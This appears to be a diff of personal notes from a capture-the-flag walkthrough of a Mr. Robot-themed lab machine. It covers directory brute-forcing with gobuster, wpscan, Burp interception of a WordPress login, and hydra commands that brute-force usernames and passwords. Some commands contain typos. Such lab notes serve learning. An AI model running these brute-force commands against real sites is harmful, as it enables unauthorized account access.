@@ -87,29 +87,41 @@ this pings the arp network to map local network
 
 vulnerbility scanner, set host [ip]
 
-gobuster dir -u [target-url/ipaddress] -w [/usr/share/wordlist/dirbuster/directory-list.2.3-small.txt]
+		gobuster dir -u [target-url/ipaddress] -w [/usr/share/wordlist/dirbuster/directory-list.2.3-small.txt]
+
 dictionary attack, against url searching for hidden directories
+
 
 DirBuster application w report generation
 target url, wordlist, don't be recursive (unneeded in this), File extension "php, txt"
 
+
 Physically explored the website, url input, triggered 404, accessed wp-login, robots.
+
 
 FIRST FLAG FOUND, [target-ipaddress/robots] > [target0ipaddress/flag-1-of-3.txt] and [target-ipaddress/fsocity.dic]
 
 download [fsocity.dic]
 
-cat head [fsocity.dic]
-	to see what the first few lines of text were
-wc [fsocity.dic]
-	word count, it's huge [that's what she said]
-cat [fsocity.dic] | sort -U  > [sorted_fsocity.dic]  
-	sorts all unique into a seperate file
-wc [sorted_fsocity.dic]
-	word count, significantly lower
+		cat head [fsocity.dic]
 
-wpscan [target-ipaddress]
-	find information partaining to word press
+to see what the first few lines of text were
+
+		wc [fsocity.dic]
+
+word count, it's huge [that's what she said]
+
+		cat [fsocity.dic] | sort -U  > [sorted_fsocity.dic]  
+
+sorts all unique into a seperate file
+
+		wc [sorted_fsocity.dic]
+
+word count, significantly lower
+
+		wpscan [target-ipaddress]
+
+find information partaining to word press
 
 Burp Suite
 used integrated browser proxy, intercepted the login action on the wp-login page.
@@ -117,16 +129,26 @@ shows that it's a post form(top), log=username and pwd=password(bottom)
 
 Brute force for username and password: 
 
-hydra -L [sorted_fsocity.dic] -p unkown [target-ipaddress] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-sumbit=Log+In:F=Invalid Username
-	-L list file upload
-	-p unkown sets the password as uknown 
-	http-post-form, because it shown on burp as a post form
-	/wp-login.php, post form location
-	log and pass set as -L and -p, log and pass can be found on the burp 
-		interception as being identifiers
-	F=Invalid Username sets fail point that is referenced in the error message when a wrong username is entered
+		hydra -L [sorted_fsocity.dic] -p unkown [target-ipaddress] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-sumbit=Log+In:F=Invalid Username
+	
+-L list file upload
+
+-p unkown sets the password as uknown 
+
+http-post-form, because it shown on burp as a post form
+
+/wp-login.php, post form location
+
+log and pass set as -L and -p, log and pass can be found on the burp 
+
+interception as being identifiers
+
+F=Invalid Username sets fail point that is referenced in the error message when a wrong username is entered
+
 
 USERNAME IS ELLIOT
+
+
 Option 1:
 hydra -l elliot -P [sorted_fsociety.dic]  [target-ipaddress] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-sumbit=Log+In:F=is incorrect'
 	-l elliot, lower case to indicate exact user
